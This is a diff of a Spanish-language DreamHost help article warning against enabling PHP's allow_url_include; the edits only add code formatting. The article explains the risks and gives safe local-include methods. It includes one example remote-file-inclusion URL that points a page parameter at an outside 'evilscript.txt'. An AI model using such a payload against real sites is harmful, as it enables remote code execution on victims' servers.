@@ -1,6 +1,6 @@
 <h2>Generalidades</h2>
 <div class="solvvy-solution">
-<p>La opción de PHP allow_url_include normalmente permite a un programador a incluir() un archivo remoto (como código <a href="https://help.dreamhost.com/hc/es/articles/214202188-Generalidades-PHP">PHP</a>) usando una URL más que un camino de un archivo local. Por razones de seguridad, DreamHost ha deshabilitado esta característica. Si un script lo requiere, debes ver otra alternativa, pues el uso de esto indica serias fallas de diseño.</p>
+<p>La opción de PHP <span class="code">allow_url_include</span> normalmente permite a un programador a incluir() un archivo remoto (como código <a href="https://help.dreamhost.com/hc/es/articles/214202188-Generalidades-PHP">PHP</a>) usando una URL más que un camino de un archivo local. Por razones de seguridad, DreamHost ha deshabilitado esta característica. Si un script lo requiere, debes ver otra alternativa, pues el uso de esto indica serias fallas de diseño.</p>
 </div>
 <h2><strong><span id="Por_que_es_malo">¿Por que es malo?</span></strong></h2>
 <div class="solvvy-solution">
@@ -9,7 +9,7 @@
 <li>Es inseguro – si tu aplicación puede ser burlada en incluir contenido de una URL fuera de sí misma (hay un número de maneras comunes de que esto pase), un atacante puede forzar tu aplicación a correr código desde su propio sitio web.</li>
 <li>Es ineficiente – Si tu script de PHP incluye contenido de una URL, entonces el servidor web debe hacer requerimientos de HTTP para generar la página. Esto hace que tu página sea más lenta de lo necesario, especialmente si el sitio del que estás cargando el contenido responde lento.</li>
 <li>No es fidedigno, por varias razones – si el servidor web del que estás cargando contenido falla ocasionalmente, tu sitio web también fallará.</li>
-<li>Es normalmente innecesario – en muchos casos, permitir allow_url_include puede ser evadido usando el contenido directamente (si está siendo cargado de un dominio que tu alojas) o cargando e imprimiendo el contenido sin evaluarlo como PHP.</li>
+<li>Es normalmente innecesario – en muchos casos, permitir <span class="code">allow_url_include</span> puede ser evadido usando el contenido directamente (si está siendo cargado de un dominio que tu alojas) o cargando e imprimiendo el contenido sin evaluarlo como PHP.</li>
 </ul>
 </div>
 <h2><strong><span id="Include_del_lado_del_servidor">Include del lado del servidor</span></strong></h2>
@@ -18,11 +18,11 @@
 <div class="preboxcontainer">
 <pre class="prebox">&lt;php include("http://example.com/includes/example_include.php"); ?&gt;</pre>
 </div>
-<p>Con allow_url_include deshabilitado, este método no funciona. En vez, el archivo debe estar incluido con un camino local, y hay tres métodos de hacerlo:</p>
+<p>Con <span class="code">allow_url_include</span> deshabilitado, este método no funciona. En vez, el archivo debe estar incluido con un camino local, y hay tres métodos de hacerlo:</p>
 <ol>
 <li>Usando un camino relativo, como ../includes/example_include.php.</li>
 <li>Usando un camino absoluto (también conocido como relative-from-root o relativo-de-root), como /home/username/example.com/includes/example_include.php.</li>
-<li>Usando una variable de ambiente de PHP $_SERVER['DOCUMENT_ROOT'], lo cual retorna el camino absoluto al directorio web del toor. Esto es la mejor solución (y la más portátil)</li>
+<li>Usando una variable de ambiente de PHP <span class="code">$_SERVER['DOCUMENT_ROOT']</span>, lo cual retorna el camino absoluto al directorio web del toor. Esto es la mejor solución (y la más portátil)</li>
 </ol>
 <h4><strong><span id="Example_Include">Ejemplos de Include</span></strong></h4>
 <div class="preboxcontainer">
@@ -65,7 +65,7 @@ include("$doc_root/includes/example_include4.php"); ?&gt;</pre>
 </div>
 <h2><strong><span id="Configurar_include_path">Configurar include_path</span></strong></h2>
 <div class="solvvy-solution">
-<p>También puedes configurar explícitamente la directiva de PHP, "include_path", sobre la marcha:</p>
+<p>También puedes configurar explícitamente la directiva de PHP, <span class="code">include_path</span>, sobre la marcha:</p>
 <div class="preboxcontainer">
 <pre class="prebox">&lt;?php ini_set('include_path',
 ini_get('include_path').':'.$_SERVER['DOCUMENT_ROOT'].'/includes');
@@ -97,14 +97,14 @@ footer...
 <div class="preboxcontainer">
 <pre class="prebox">http://example.com/index.php?page=varied.php</pre>
 </div>
-<p>Si allow_url_include está habilitado, este sistema puede ser explotado simplemente cargando un valor de la variable en la línea de query:</p>
+<p>Si <span class="code">allow_url_include</span> está habilitado, este sistema puede ser explotado simplemente cargando un valor de la variable en la línea de query:</p>
 <div class="preboxcontainer">
 <pre class="prebox">http://example.com/index.php?page=http://websitehelp.support/evilscript.txt</pre>
 </div>
 </div>
 <h2><strong><span id="Nota_final">Nota final</span></strong></h2>
 <div class="solvvy-solution">
-<p>Solo di no. Habilitar allow_url_include es una idea terrible que expone tu sitio web, y los sitios web de otros en tu servidor compartido, un riesgo innecesario.</p>
+<p>Solo di no. Habilitar <span class="code">allow_url_include</span> es una idea terrible que expone tu sitio web, y los sitios web de otros en tu servidor compartido, un riesgo innecesario.</p>
 </div>
 <h2><strong><span id="Ver_también">Ver también</span></strong></h2>
 <div class="solvvy-hidden">
